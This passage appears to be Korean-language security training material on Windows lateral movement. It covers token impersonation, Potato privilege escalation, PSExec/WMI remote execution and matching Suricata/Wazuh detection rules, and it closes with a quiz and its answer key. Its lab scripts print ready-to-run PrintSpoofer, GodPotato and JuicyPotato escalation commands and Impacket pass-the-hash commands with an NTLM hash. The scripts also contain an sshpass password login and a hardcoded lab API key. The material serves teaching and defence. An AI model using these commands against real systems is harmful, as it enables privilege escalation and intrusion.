### 공격 전제 조건

| 조건 | 설명 |
|------|------|
| SeImpersonatePrivilege | 서비스 계정에 기본 부여 |
| SeAssignPrimaryTokenPrivilege | 프로세스 토큰 교체 권한 |
| 대상 토큰 존재 | 관리자가 로그인된 상태 |

### 주요 공격 도구

```
+----------------------------------------------------------+
| Token Impersonation 공격 도구 비교                        |
+-------------+-------------------------------------------+
| incognito   | Meterpreter 모듈, 토큰 열거/가장           |
| JuicyPotato | SeImpersonatePrivilege → SYSTEM            |
| PrintSpoofer| SpoolSS 서비스를 악용한 권한 상승           |
| GodPotato  | DCOM → 토큰 가장 (최신, Windows 11 지원)    |
| RoguePotato| 원격 OXID resolver를 통한 토큰 가장          |
+-------------+-------------------------------------------+
```

### ATT&CK 매핑

| 기법 | ATT&CK ID | 설명 |
|------|-----------|------|
| Access Token Manipulation | T1134 | 토큰 조작 상위 분류 |
| Token Impersonation/Theft | T1134.001 | 토큰 탈취 및 가장 |
| Create Process with Token | T1134.002 | 탈취한 토큰으로 프로세스 생성 |
| Make and Impersonate Token | T1134.003 | 크리덴셜로 토큰 생성 후 가장 |

### 실습 5: Token Impersonation 시뮬레이션

**실습 목적**: Windows 토큰 시스템의 구조를 이해하고, Token Impersonation 공격의 원리를 Linux 환경에서 유사하게 시뮬레이션한다. 서비스 계정의 SeImpersonatePrivilege가 왜 위험한지 체험한다.

**배우는 것**: 토큰 유형, Impersonation Level, Potato 계열 공격 원리, 탐지 방법

```bash
# -- opsclaw 서버에서 실행 --

# 1. Linux에서의 유사 개념: setuid/capabilities
echo "[+] Linux의 Token Impersonation 유사 개념:"
echo ""

# setuid 비트가 설정된 바이너리 검색
echo "=== setuid 바이너리 목록 ==="
find /usr/bin /usr/sbin -perm -4000 2>/dev/null | head -20
echo ""

# capabilities 확인
echo "=== Capabilities 설정된 바이너리 ==="
getcap /usr/bin/* /usr/sbin/* 2>/dev/null | head -10
echo ""

# 2. Token Impersonation 시뮬레이션 (sudo를 통한 권한 위임)
echo "[+] Token Impersonation 시뮬레이션:"
echo ""
echo "현재 사용자: $(whoami)"
echo "현재 UID: $(id -u)"
echo "현재 그룹: $(id -G | tr ' ' ',')"
echo ""

# 3. Windows Token vs Linux 대응 관계
echo "[+] Windows Token ↔ Linux 대응:"
echo "  Primary Token      ↔  UID/GID (프로세스 소유자)"
echo "  Impersonation      ↔  setuid/sudo (임시 권한 변경)"
echo "  SeImpersonatePriv  ↔  CAP_SETUID capability"
echo "  SYSTEM token       ↔  root (UID 0)"
echo ""

# 4. Potato 계열 공격 원리 설명
echo "[+] Potato 공격 체인:"
echo "  1. 서비스 계정이 SeImpersonatePrivilege 보유"
echo "  2. 고권한 프로세스(SYSTEM)가 공격자의 서버에 인증하도록 유도"
echo "  3. 인증 과정에서 SYSTEM 토큰 캡처"
echo "  4. 캡처한 토큰으로 새 프로세스 실행"
echo ""
echo "  JuicyPotato: DCOM → BITS 서비스의 SYSTEM 토큰 캡처"
echo "  PrintSpoofer: Spooler 서비스 → Named Pipe를 통한 토큰 캡처"
echo "  GodPotato: DCOM → 모든 Windows 버전에서 동작"

# 5. 탐지 방법
echo ""
echo "[+] Token Impersonation 탐지:"
echo "  - Sysmon Event ID 8: CreateRemoteThread (토큰 주입)"
echo "  - Sysmon Event ID 10: ProcessAccess (LSASS 등 민감 프로세스)"
echo "  - Windows 4688: 새 프로세스 생성 (부모-자식 관계 분석)"
echo "  - 비정상 서비스 계정의 cmd.exe/powershell.exe 실행"
```

**명령어 해설**:
- `find -perm -4000`: setuid 비트가 설정된 파일을 검색한다. setuid 파일은 실행 시 파일 소유자의 권한으로 실행된다
- `getcap`: 파일에 설정된 Linux capabilities를 조회한다. CAP_SETUID는 UID를 변경할 수 있는 권한이다
- `id -G`: 현재 사용자가 속한 모든 그룹의 GID를 출력한다

**결과 해석**: Linux의 setuid/capabilities와 Windows의 Token Impersonation은 유사한 보안 위험을 가진다. 서비스 계정에 불필요한 특권(SeImpersonatePrivilege)이 부여되면, 해당 서비스가 침해될 경우 SYSTEM 권한 탈취로 이어진다.

**실전 활용**: 웹 셸이나 SQL Injection으로 서비스 계정(IIS AppPool, MSSQL 등)의 코드 실행을 획득한 경우, Potato 공격으로 SYSTEM 권한을 얻는 것이 실전에서 매우 흔하다. 방어 측면에서는 서비스 계정의 SeImpersonatePrivilege를 제거하거나, gMSA를 사용하여 서비스 격리를 강화해야 한다.

**트러블슈팅**:
- `find: Permission denied`: 일부 디렉토리 접근 제한 → `2>/dev/null`로 에러 무시
- `getcap: command not found`: `sudo apt install libcap2-bin`으로 설치
- 토큰 열거 실패(incognito): Meterpreter 세션이 SYSTEM이 아닌 경우 → `getsystem` 먼저 실행

### 실습 6: Potato 계열 권한 상승 시뮬레이션

**실습 목적**: JuicyPotato, PrintSpoofer 등 Potato 계열 공격의 동작 원리를 단계별로 분석하고, 각 도구의 적용 조건과 한계를 이해한다.

**배우는 것**: DCOM/Named Pipe를 통한 토큰 탈취 원리, Windows 버전별 적용 가능 도구, 방어 방법

```bash
# -- opsclaw 서버에서 실행 --

# 1. Potato 계열 도구 비교 분석
echo "+===============================================================+"
echo "|              Potato 계열 권한 상승 도구 비교                   |"
echo "+=================+===============+===============+============+"
echo "| 도구            | 공격 벡터      | Windows 버전  | 탐지 난이도 |"
echo "+=================+===============+===============+============+"
echo "| HotPotato       | NBNS+WPAD    | 7/8/10/2012  | 중간       |"
echo "| RottenPotato    | DCOM NTLM    | 7~10 (1809)  | 낮음       |"
echo "| JuicyPotato     | DCOM CLSID   | 7~10 (1809)  | 낮음       |"
echo "| RoguePotato     | 원격 OXID    | 10/2016+     | 중간       |"
echo "| PrintSpoofer    | Spooler Pipe | 10/2016/2019 | 높음       |"
echo "| GodPotato       | DCOM 개선    | 8~11/2022    | 높음       |"
echo "| SweetPotato     | 다중 벡터    | 종합         | 높음       |"
echo "+=================+===============+===============+============+"
echo ""

# 2. PrintSpoofer 공격 흐름 분석
echo "[+] PrintSpoofer 공격 상세 흐름:"
echo ""
echo "  단계 1: Named Pipe 서버 생성"
echo "    → \\.\pipe\test\pipe\spoolss"
echo ""
echo "  단계 2: SpoolService에 연결 유도"
echo "    → RpcRemoteFindFirstPrinterChangeNotification()"
echo "    → Spooler가 SYSTEM 권한으로 Named Pipe에 연결"
echo ""
echo "  단계 3: SYSTEM 토큰 캡처"
echo "    → ImpersonateNamedPipeClient()"
echo "    → SYSTEM 토큰 획득"
echo ""
echo "  단계 4: 토큰으로 프로세스 생성"
echo "    → CreateProcessWithTokenW()"
echo "    → SYSTEM 권한의 cmd.exe 실행"

# 3. 실제 실행 명령 예시
echo ""
echo "[+] 실행 명령 예시:"
echo "  # PrintSpoofer"
echo '  PrintSpoofer64.exe -i -c "cmd /c whoami"'
echo "  → nt authority\system"
echo ""
echo "  # GodPotato"
echo '  GodPotato.exe -cmd "cmd /c whoami"'
echo "  → nt authority\system"
echo ""
echo "  # JuicyPotato (CLSID 지정 필요)"
echo '  JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}'
echo "  → nt authority\system"

# 4. 방어 대책
echo ""
echo "[+] 방어 대책:"
echo "  1. Print Spooler 서비스 비활성화 (프린터 미사용 서버)"
echo "     sc config Spooler start= disabled"
echo "  2. SeImpersonatePrivilege 제거"
echo "     secpol.msc → 로컬 정책 → 사용자 권한 할당"
echo "  3. DCOM 접근 제한"
echo "     dcomcnfg → DCOM 보안 설정"
echo "  4. 서비스 계정 권한 최소화"
echo "     gMSA 사용 + 불필요한 권한 제거"
```

**명령어 해설**:
- `PrintSpoofer64.exe -i -c "cmd"`: -i는 대화형(interactive) 모드, -c는 실행할 명령
- `ImpersonateNamedPipeClient()`: Windows API로 Named Pipe에 연결된 클라이언트의 토큰을 가장한다
- `CreateProcessWithTokenW()`: 지정한 토큰의 보안 컨텍스트로 새 프로세스를 생성한다
- CLSID: COM 객체의 고유 식별자. JuicyPotato는 SYSTEM으로 실행되는 COM 객체를 지정해야 한다

**결과 해석**: Potato 계열 공격은 Windows의 설계적 특성(서비스 계정의 Impersonation 권한)을 악용한다. 최신 Windows에서는 일부 벡터가 패치되었지만, GodPotato 등 새로운 변종이 계속 등장한다. 근본적 해결책은 불필요한 서비스 계정 권한 제거와 서비스 격리 강화이다.

**실전 활용**: 웹 애플리케이션 취약점으로 IIS 서비스 계정 권한을 획득한 후, Potato 공격으로 SYSTEM 권한을 얻는 것이 실전 침투 테스트의 표준 과정이다. 블루팀은 서비스 계정에서 비정상적인 cmd.exe/powershell.exe 실행을 모니터링해야 한다.

**트러블슈팅**:
- JuicyPotato 실패: Windows 10 1809+ 에서 DCOM 보안 강화로 차단 → RoguePotato/PrintSpoofer 사용
- PrintSpoofer 실패: Print Spooler 서비스 비활성화 → GodPotato로 대체
- 토큰 생성 실패: SeImpersonatePrivilege 미부여 → 다른 권한 상승 경로 탐색

### 방어 대책

| 대책 | 설명 |
|------|------|
| SeImpersonatePrivilege 제거 | 불필요한 서비스 계정에서 권한 제거 |
| gMSA 사용 | 서비스 계정을 관리형으로 전환 |
| 서비스 격리 | 각 서비스를 별도 계정으로 실행 |
| 특권 로그인 제한 | 관리자 계정의 대화형 로그인 최소화 |
| PPL(Protected Process Light) | LSASS를 보호 프로세스로 실행 |

---

# Part 4: WMI/PSExec 원격 실행과 탐지 (40분)

## 4.1 PSExec의 동작 원리

PSExec은 Sysinternals의 원격 실행 도구로, SMB를 통해 대상 시스템에 서비스를 생성하고 명령을 실행한다.

### PSExec 실행 흐름

```
1. SMB로 대상의 ADMIN$ 공유에 연결 (인증)
2. PSEXESVC.exe를 ADMIN$ 공유에 업로드
3. 원격 서비스 생성 (Service Control Manager)
4. 서비스 시작 → 명령 실행
5. 결과를 Named Pipe로 전달
6. 서비스 삭제 및 파일 정리
```

### PSExec의 포렌식 흔적

| 흔적 유형 | 위치 | 내용 |
|----------|------|------|
| 서비스 생성 | Event ID 7045 | PSEXESVC 서비스 등록 |
| 프로세스 생성 | Event ID 4688 | PSEXESVC.exe → cmd.exe |
| 네트워크 로그온 | Event ID 4624 (유형 3) | SMB 인증 |
| SMB 파일 공유 | Event ID 5140 | ADMIN$ 접근 |
| 파일 생성 | Sysmon Event ID 11 | C:\Windows\PSEXESVC.exe |

## 4.2 WMI 원격 실행

WMI(Windows Management Instrumentation)는 Windows의 관리 인터페이스로, 원격 명령 실행에 악용될 수 있다. PSExec보다 흔적이 적다.

### WMI 실행 흐름

```
1. DCOM/WMI를 통해 대상에 연결 (포트 135 + 동적 포트)
2. Win32_Process.Create() 호출
3. 대상 시스템에서 프로세스 생성
4. (서비스 생성 없음, 파일 업로드 없음)
```

### PSExec vs WMI 비교

| 항목 | PSExec | WMI |
|------|--------|-----|
| 프로토콜 | SMB (445) | DCOM (135) + 동적 포트 |
| 서비스 생성 | 있음 (PSEXESVC) | 없음 |
| 파일 업로드 | 있음 | 없음 |
| 출력 반환 | 실시간 (Named Pipe) | 없음 (파일로 리다이렉트 필요) |
| 탐지 난이도 | 낮음 (흔적 많음) | 높음 (흔적 적음) |
| Impacket 도구 | psexec.py | wmiexec.py |

### 실습 7: WMI/PSExec 원격 실행 시뮬레이션

**실습 목적**: WMI와 PSExec을 통한 원격 명령 실행의 차이점을 이해하고, 각 방식이 남기는 포렌식 흔적을 비교 분석한다.

**배우는 것**: SMB/DCOM 프로토콜, 서비스 기반 vs 프로세스 기반 원격 실행, 이벤트 로그 분석

```bash
# -- opsclaw 서버에서 실행 --

# 1. Impacket PSExec/WMIExec 비교
echo "[+] PSExec vs WMIExec 명령 비교:"
echo ""
echo "# PSExec (서비스 생성 방식)"
echo "psexec.py LABCORP/admin@10.20.30.80 -hashes :a4f49c406510bdcab6824ee7c30fd852"
echo "  → 서비스 생성 → 4688+7045 이벤트 → 높은 탐지 확률"
echo ""
echo "# WMIExec (WMI 방식)"
echo "wmiexec.py LABCORP/admin@10.20.30.80 -hashes :a4f49c406510bdcab6824ee7c30fd852"
echo "  → 서비스 미생성 → 4688 이벤트만 → 낮은 탐지 확률"
echo ""
echo "# SMBExec (SMB 공유 방식)"
echo "smbexec.py LABCORP/admin@10.20.30.80 -hashes :a4f49c406510bdcab6824ee7c30fd852"
echo "  → 서비스 생성 (랜덤 이름) → cmd.exe /Q /c 패턴"
echo ""
echo "# ATExec (Scheduled Task 방식)"
echo "atexec.py LABCORP/admin@10.20.30.80 -hashes :a4f49c406510bdcab6824ee7c30fd852 'hostname'"
echo "  → 예약 작업 생성 → 실행 → 결과 파일 읽기 → 작업 삭제"

# 2. SSH를 통한 원격 실행 (Linux 환경 실습)
echo ""
echo "[+] Linux 환경 원격 실행 실습:"
echo ""

# web 서버에 원격 명령 실행
echo "=== SSH를 통한 원격 명령 실행 ==="
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "hostname && id && uptime" 2>/dev/null || \
  echo "[참고] web 서버 접속 불가 시 스킵"

echo ""

# 3. OpsClaw dispatch를 통한 원격 실행 (측면 이동 시뮬레이션)
echo "[+] OpsClaw dispatch를 통한 원격 실행:"
PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "name": "week04-lateral-movement",
    "request_text": "측면 이동 시뮬레이션: 다중 서버 정보 수집",
    "master_mode": "external"
  }' 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)

if [ -n "$PROJECT_ID" ]; then
    echo "  프로젝트 ID: $PROJECT_ID"
    
    # Stage 전환
    curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/plan" \
      -H "X-API-Key: opsclaw-api-key-2026" > /dev/null 2>&1
    curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/execute" \
      -H "X-API-Key: opsclaw-api-key-2026" > /dev/null 2>&1
    
    # 다중 서버 정보 수집 (측면 이동 시뮬레이션)
    curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/execute-plan" \
      -H "Content-Type: application/json" \
      -H "X-API-Key: opsclaw-api-key-2026" \
      -d '{
        "tasks": [
          {"order":1,"instruction_prompt":"hostname && id && cat /etc/os-release | head -3","risk_level":"low","subagent_url":"http://localhost:8002"},
          {"order":2,"instruction_prompt":"hostname && id && cat /etc/os-release | head -3","risk_level":"low","subagent_url":"http://10.20.30.80:8002"},
          {"order":3,"instruction_prompt":"hostname && id && cat /etc/os-release | head -3","risk_level":"low","subagent_url":"http://10.20.30.100:8002"}
        ],
        "subagent_url":"http://localhost:8002"
      }' 2>/dev/null | python3 -m json.tool 2>/dev/null
    
    echo ""
    echo "[+] 증거 확인:"
    curl -s -H "X-API-Key: opsclaw-api-key-2026" \
      "http://localhost:8000/projects/$PROJECT_ID/evidence/summary" 2>/dev/null | python3 -m json.tool 2>/dev/null
else
    echo "[참고] OpsClaw API 미기동 시 스킵"
fi
```

**명령어 해설**:
- `psexec.py`: SMB 기반 원격 실행. 대상에 서비스를 설치하므로 흔적이 많다
- `wmiexec.py`: WMI/DCOM 기반 원격 실행. 서비스 미설치로 흔적이 적다
- `smbexec.py`: SMB 공유를 통한 원격 실행. 서비스 이름이 랜덤이므로 PSExec보다 탐지 어렵다
- `atexec.py`: Scheduled Task를 생성하여 실행 후 삭제. Task Scheduler 로그에 흔적 남음

**결과 해석**: 각 원격 실행 방식은 서로 다른 포렌식 흔적을 남긴다. PSExec은 서비스 생성이 확실한 탐지 포인트이고, WMI는 WmiPrvSE.exe의 자식 프로세스를 모니터링해야 한다. OpsClaw의 dispatch/execute-plan은 SubAgent를 통해 각 서버에서 직접 실행하므로, SSH 또는 에이전트 프로토콜의 흔적을 남긴다.

**실전 활용**: 레드팀은 탐지를 피하기 위해 WMI나 DCOM을 선호하고, 블루팀은 모든 원격 실행 방식의 로그를 수집해야 한다. Sysmon + Wazuh 조합으로 프로세스 생성 체인(부모-자식 관계)을 모니터링하는 것이 가장 효과적이다.

**트러블슈팅**:
- `sshpass: command not found`: `sudo apt install sshpass`로 설치
- OpsClaw API 타임아웃: Manager API가 기동 중인지 확인 (`curl http://localhost:8000/health`)
- SubAgent 접속 불가: 방화벽 규칙 확인 (`nftables list ruleset | grep 8002`)

### 실습 8: Suricata에서 원격 실행 탐지

**실습 목적**: PSExec과 WMI를 통한 원격 실행을 네트워크 레벨에서 탐지하는 Suricata 룰을 작성하고, secu 서버에서 실제로 검증한다.

**배우는 것**: SMB 프로토콜 분석, DCOM 탐지, Suricata 커스텀 룰 작성

```bash
# -- secu 서버에서 실행 --

# 1. PSExec 탐지 Suricata 룰
cat << 'PSEXECEOF'
# PSExec 서비스 바이너리 업로드 탐지
alert smb any any -> any 445 (msg:"OPSCLAW PSExec Service Binary Upload to ADMIN$"; \
    flow:to_server,established; \
    content:"PSEXESVC"; nocase; \
    content:"|FF|SMB"; depth:4; \
    classtype:trojan-activity; \
    sid:2026043; rev:1;)

# SMB Named Pipe 생성 (PSExec 통신 채널)
alert smb any any -> any 445 (msg:"OPSCLAW PSExec Named Pipe Creation"; \
    flow:to_server,established; \
    content:"|00|P|00|S|00|E|00|X|00|E|00|S|00|V|00|C"; \
    classtype:trojan-activity; \
    sid:2026044; rev:1;)

# WMI/DCOM 원격 프로세스 생성 탐지
alert tcp any any -> any 135 (msg:"OPSCLAW WMI Remote Process Creation via DCOM"; \
    flow:to_server,established; \
    content:"|05 00|"; depth:2; \
    content:"Win32_Process"; nocase; \
    classtype:trojan-activity; \
    sid:2026045; rev:1;)
PSEXECEOF

echo "[+] PSExec/WMI 탐지 룰 작성 완료"
echo ""

# 2. 현재 Suricata 룰 확인
echo "[+] Suricata 커스텀 룰 위치:"
ls -la /etc/suricata/rules/local.rules 2>/dev/null || \
  echo "  /etc/suricata/rules/local.rules 미존재"

# 3. Suricata EVE 로그에서 SMB 이벤트 확인
echo ""
echo "[+] 최근 SMB 관련 Suricata 알림:"
if [ -f /var/log/suricata/eve.json ]; then
    grep -c "smb" /var/log/suricata/eve.json 2>/dev/null || echo "  SMB 이벤트 없음"
else
    echo "  [참고] Suricata 로그 파일 없음"
fi

# 4. Wazuh 룰: 원격 실행 탐지
cat << 'WAZUHEOF'
<!-- PSExec/WMI 원격 실행 탐지 -->
<group name="lateral_movement,">
  <!-- PSExec 서비스 설치 탐지 -->
  <rule id="100210" level="12">
    <if_sid>60106</if_sid>
    <field name="win.eventdata.serviceName">PSEXE</field>
    <description>PSExec: Remote service installation detected</description>
    <mitre>
      <id>T1021.002</id>
      <id>T1569.002</id>
    </mitre>
    <group>lateral_movement,</group>
  </rule>

  <!-- WMI 프로세스 생성 탐지 -->
  <rule id="100211" level="10">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.parentImage">WmiPrvSE.exe</field>
    <field name="win.eventdata.image">cmd.exe|powershell.exe</field>
    <description>WMI: Suspicious process creation by WmiPrvSE</description>
    <mitre>
      <id>T1047</id>
    </mitre>
    <group>lateral_movement,</group>
  </rule>

  <!-- ADMIN$ 공유 접근 탐지 -->
  <rule id="100212" level="8">
    <if_sid>60103</if_sid>
    <field name="win.eventdata.shareName">\\*\ADMIN$</field>
    <description>Admin share access: Potential lateral movement</description>
    <mitre>
      <id>T1021.002</id>
    </mitre>
    <group>lateral_movement,</group>
  </rule>
</group>
WAZUHEOF

echo ""
echo "[+] Wazuh 원격 실행 탐지 룰 출력 완료"
```

**명령어 해설**:
- `content:"PSEXESVC"; nocase;`: SMB 트래픽에서 PSEXESVC 문자열을 대소문자 무시하고 검색
- `content:"|FF|SMB"; depth:4;`: SMB 프로토콜 헤더 확인 (처음 4바이트)
- `flow:to_server,established;`: 서버 방향으로 이미 연결이 수립된 세션만 탐지
- Wazuh `<field>`: Windows 이벤트의 특정 필드 값으로 매칭하는 조건

**결과 해석**: PSExec은 네트워크에서 "PSEXESVC" 문자열과 Named Pipe 패턴으로 비교적 쉽게 탐지된다. WMI/DCOM은 RPC 프로토콜 내부에서 Win32_Process 호출을 탐지해야 하므로 더 복잡하다. 암호화된 SMB3 환경에서는 네트워크 기반 탐지가 어려우므로 엔드포인트 로그가 필수이다.

**실전 활용**: 실제 환경에서는 Impacket의 변형 도구들이 서비스 이름을 랜덤화하므로, "PSEXESVC" 문자열 기반 탐지만으로는 부족하다. 서비스 생성 이벤트(7045) + SMB ADMIN$ 접근(5140) + 네트워크 로그온(4624)의 상관 분석이 필요하다.

**트러블슈팅**:
- Suricata 룰 로딩 실패: 문법 오류 → `suricata -T -c /etc/suricata/suricata.yaml`로 검증
- SMB3 암호화로 content 매칭 불가: 엔드포인트 기반 탐지로 전환
- DCOM 동적 포트 탐지 어려움: 포트 135에서 초기 바인딩만 탐지 가능

---

## 종합 시나리오: 측면 이동 체인 공격과 탐지 (20분)

### 실습 9: 전체 측면 이동 체인 시뮬레이션

**실습 목적**: Week 04에서 학습한 모든 기법을 연결하여 실제 APT 공격에서의 측면 이동 체인을 구성하고, 각 단계의 탐지 포인트를 통합적으로 분석한다.

**배우는 것**: 공격 체인의 연결 관계, 다층 방어의 중요성, 탐지 우선순위 결정

```bash
# -- opsclaw 서버에서 실행 --

# 전체 측면 이동 체인 시뮬레이션
echo "+==============================================================+"
echo "|        측면 이동 체인 시뮬레이션 (ATT&CK 매핑)              |"
echo "+==============================================================+"
echo "|                                                            |"
echo "| Phase 1: 초기 침투 (T1190)                                  |"
echo "|   +→ 웹 서버 RCE → 서비스 계정 셸 획득                       |"
echo "|                                                            |"
echo "| Phase 2: 크리덴셜 덤프 (T1003.001)                          |"
echo "|   +→ mimikatz로 LSASS에서 NTLM 해시 추출                    |"
echo "|   +→ Administrator: a4f49c406510...                         |"
echo "|   +→ svc_backup: 32ed87bdb5fd...                            |"
echo "|                                                            |"
echo "| Phase 3: Pass-the-Hash (T1550.002)                          |"
echo "|   +→ PtH로 백업 서버 접근                                    |"
echo "|   +→ 추가 해시 수집                                         |"
echo "|                                                            |"
echo "| Phase 4: Kerberoasting (T1558.003)                          |"
echo "|   +→ SPN 열거 → svc_mssql 티켓 크래킹                       |"
echo "|   +→ DB 서버 접근                                           |"
echo "|                                                            |"
echo "| Phase 5: WMI 원격 실행 (T1047)                              |"
echo "|   +→ DB 서버에서 도메인 관리자 세션 발견                       |"
echo "|   +→ Token Impersonation (T1134.001)                        |"
echo "|   +→ 도메인 장악                                            |"
echo "|                                                            |"
echo "+==============================================================+"
echo ""

# 탐지 매트릭스
echo "+------------------+--------------------+-------------+"
echo "| 공격 단계         | 탐지 방법           | 탐지 확률    |"
echo "+------------------┼--------------------┼-------------+"
echo "| 초기 침투         | WAF/IDS            | 중간         |"
echo "| 크리덴셜 덤프     | Sysmon + EDR       | 높음         |"
echo "| Pass-the-Hash    | 이벤트 4624 분석    | 중간         |"
echo "| Kerberoasting    | 이벤트 4769 분석    | 낮음~중간    |"
echo "| WMI 원격 실행     | WmiPrvSE 모니터링   | 낮음         |"
echo "| Token Imperson.  | Sysmon Event 10    | 중간         |"
echo "+------------------+--------------------+-------------+"

# OpsClaw로 탐지 룰 배포 시뮬레이션
echo ""
echo "[+] OpsClaw 측면 이동 체인 탐지 자동화:"
CHAIN_PROJECT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "name": "week04-chain-detection",
    "request_text": "측면 이동 체인 탐지 자동화",
    "master_mode": "external"
  }' 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)

if [ -n "$CHAIN_PROJECT" ]; then
    curl -s -X POST "http://localhost:8000/projects/$CHAIN_PROJECT/plan" \
      -H "X-API-Key: opsclaw-api-key-2026" > /dev/null 2>&1
    curl -s -X POST "http://localhost:8000/projects/$CHAIN_PROJECT/execute" \
      -H "X-API-Key: opsclaw-api-key-2026" > /dev/null 2>&1
    
    curl -s -X POST "http://localhost:8000/projects/$CHAIN_PROJECT/execute-plan" \
      -H "Content-Type: application/json" \
      -H "X-API-Key: opsclaw-api-key-2026" \
      -d '{
        "tasks": [
          {"order":1,"instruction_prompt":"suricata --build-info 2>/dev/null | head -5 || echo Suricata not installed","risk_level":"low","subagent_url":"http://10.20.30.1:8002"},
          {"order":2,"instruction_prompt":"cat /var/ossec/etc/rules/local_rules.xml 2>/dev/null | head -20 || echo No custom Wazuh rules","risk_level":"low","subagent_url":"http://10.20.30.100:8002"},
          {"order":3,"instruction_prompt":"ss -tlnp | grep -E \"(445|135|139)\" || echo No SMB/RPC ports listening","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
        ],
        "subagent_url":"http://localhost:8002"
      }' 2>/dev/null | python3 -m json.tool 2>/dev/null
    
    echo ""
    curl -s -X POST "http://localhost:8000/projects/$CHAIN_PROJECT/completion-report" \
      -H "Content-Type: application/json" \
      -H "X-API-Key: opsclaw-api-key-2026" \
      -d '{"summary":"측면 이동 체인 탐지 인프라 점검 완료","outcome":"success","work_details":["Suricata 버전 확인","Wazuh 커스텀 룰 점검","SMB/RPC 포트 상태 확인"]}' 2>/dev/null | python3 -m json.tool 2>/dev/null
else
    echo "[참고] OpsClaw API 미기동 시 스킵"
fi
```

**명령어 해설**: 이 실습은 전체 공격 체인을 시각화하고 각 단계의 ATT&CK ID와 탐지 방법을 매핑한다. OpsClaw execute-plan을 통해 Suricata, Wazuh, 네트워크 포트 상태를 자동 점검한다.

**결과 해석**: 측면 이동 체인에서 가장 탐지하기 어려운 단계는 Kerberoasting과 WMI 원격 실행이다. 반면 크리덴셜 덤프(LSASS 접근)와 PSExec은 Sysmon + EDR 조합으로 높은 확률로 탐지 가능하다. 다층 방어(Defense in Depth)를 적용하여 모든 단계에 탐지 레이어를 배치해야 한다.

**실전 활용**: 실제 SOC 환경에서는 측면 이동 탐지를 위해 네트워크(Suricata) + 엔드포인트(Sysmon/Wazuh) + 인증(AD 이벤트) 3가지 데이터 소스를 상관 분석해야 한다. OpsClaw를 통해 이 3가지 소스의 탐지 상태를 자동으로 점검하고 룰을 배포할 수 있다.

**트러블슈팅**:
- 상관 분석 미작동: 시간 동기화(NTP) 확인 → 모든 호스트의 시각이 동일해야 상관 분석 가능
- 로그 누락: Sysmon 구성(sysmonconfig.xml)에서 ProcessAccess, CreateRemoteThread 이벤트 활성화 확인
- Wazuh 에이전트 미응답: `systemctl status wazuh-agent`로 상태 확인

---

## 검증 체크리스트

실습 완료 후 다음 항목을 스스로 확인한다:

- [ ] NTLM 인증의 챌린지-응답 방식을 설명할 수 있는가?
- [ ] Pass-the-Hash가 가능한 이유(해시 기반 인증 구조)를 설명할 수 있는가?
- [ ] mimikatz의 sekurlsa::logonpasswords가 하는 일을 설명할 수 있는가?
- [ ] PtH 공격에 대한 방어 대책 3가지 이상 나열할 수 있는가?
- [ ] Kerberos 인증의 3단계(AS, TGS, AP) 흐름을 설명할 수 있는가?
- [ ] Kerberoasting이 가능한 이유(TGS 암호화 키 = 서비스 계정 비밀번호)를 설명할 수 있는가?
- [ ] RC4 vs AES 암호화의 크래킹 난이도 차이를 설명할 수 있는가?
- [ ] Token Impersonation과 SeImpersonatePrivilege의 관계를 설명할 수 있는가?
- [ ] PSExec과 WMI의 포렌식 흔적 차이를 3가지 이상 비교할 수 있는가?
- [ ] OpsClaw를 통해 다중 서버에 측면 이동 탐지 룰을 배포할 수 있는가?

---

## 자가 점검 퀴즈 (10문항)

**Q1.** Pass-the-Hash 공격이 가능한 근본적인 이유는?
- (a) 비밀번호가 평문으로 저장  (b) **NTLM 인증이 해시 자체로 챌린지에 응답**  (c) TCP/IP 취약점  (d) DNS 스푸핑

**Q2.** mimikatz에서 LSASS 메모리에 접근하기 위해 필요한 권한은?
- (a) 일반 사용자  (b) Power Users  (c) **SeDebugPrivilege (관리자)**  (d) Guest

**Q3.** Kerberoasting에서 TGS 티켓의 암호화 키는?
- (a) 사용자 비밀번호  (b) krbtgt 비밀번호  (c) **SPN 등록 서비스 계정의 비밀번호**  (d) 세션 키

**Q4.** Kerberoasting 탐지를 위해 모니터링해야 하는 Windows 이벤트 ID는?
- (a) 4624  (b) 4625  (c) **4769**  (d) 7045

**Q5.** Token Impersonation 공격의 전제 조건이 아닌 것은?
- (a) SeImpersonatePrivilege  (b) 대상 토큰 존재  (c) **도메인 관리자 권한**  (d) 로컬 관리자 권한

**Q6.** PSExec이 남기는 고유한 포렌식 흔적은?
- (a) DNS 쿼리  (b) **PSEXESVC 서비스 생성 (Event ID 7045)**  (c) ICMP 패킷  (d) HTTP 요청

**Q7.** WMI 원격 실행이 PSExec보다 탐지가 어려운 이유는?
- (a) 암호화  (b) **서비스를 생성하지 않고 파일을 업로드하지 않음**  (c) UDP 사용  (d) 로그 삭제

**Q8.** Pass-the-Hash에 대한 가장 효과적인 방어 대책은?
- (a) 안티바이러스  (b) 방화벽  (c) **Credential Guard + LAPS**  (d) VPN

**Q9.** Kerberoasting 방어를 위해 서비스 계정 비밀번호는 최소 몇 자 이상을 권장하는가?
- (a) 8자  (b) 12자  (c) 16자  (d) **25자 이상**

**Q10.** 다음 중 가장 흔적이 적은 원격 실행 방식은?
- (a) PSExec  (b) **WMIExec**  (c) SMBExec  (d) 모두 동일

**정답:** Q1:b, Q2:c, Q3:c, Q4:c, Q5:c, Q6:b, Q7:b, Q8:c, Q9:d, Q10:b

---

## 과제

### 과제 1: 측면 이동 체인 재구성 (필수)
본 강의에서 다룬 4가지 기법(PtH, Kerberoasting, Token Impersonation, WMI/PSExec)을 활용하여:
- 가상의 기업 네트워크(웹서버 → DB서버 → DC) 침투 시나리오를 설계하라
- 각 단계에 ATT&CK ID를 매핑하라
- OpsClaw execute-plan으로 시뮬레이션 가능한 JSON 페이로드를 작성하라

